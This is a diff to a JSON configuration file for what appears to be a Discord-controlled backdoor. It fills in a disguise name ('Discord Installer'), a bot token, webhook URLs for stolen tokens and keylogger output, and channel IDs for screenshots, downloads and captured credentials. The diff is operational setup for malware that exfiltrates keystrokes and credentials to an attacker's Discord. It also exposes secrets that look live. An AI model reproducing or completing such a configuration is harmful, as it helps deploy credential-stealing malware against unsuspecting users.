@@ -1,13 +1,13 @@
 {
     "settings":{
-        "backdoor-name": "None",
-        "bot-token": "None",
-        "token-webhook": "None",
-        "keylogger-webhook": "None",
-        "screenshots-id": "None",
-        "downloads-id": "None",
-        "agent-online-id": "None",
-        "credentials-id": "None",
-        "auto-keylogger": "None"
+        "backdoor-name": "Discord Installer",
+        "bot-token": "OTQ0NjY2MjE0NDk0NTExMTU0.YhE6-A.sLVPiNp6mV-PzWKdDB-Lpajk0wY",
+        "token-webhook": "https://discord.com/api/webhooks/944672021386780692/9-RZL-j5hKbnEsp9lu3lDL0uICV4HGsegPCCJWK75er_PLPQKhb8JDKawDCaaKt1nPsL",
+        "keylogger-webhook": "https://discord.com/api/webhooks/944672103951646811/KxVUTqx1qWJwGXt4L2XNA3cZu2EiSkVDsk2_RkiDBX3gVEIJoe7br70y3hZwDS9LqPKV",
+        "screenshots-id": "944671828679483532",
+        "downloads-id": "944671919616184320",
+        "agent-online-id": "944671668142485544",
+        "credentials-id": "944671887961763930",
+        "auto-keylogger": "false"
     }
 }
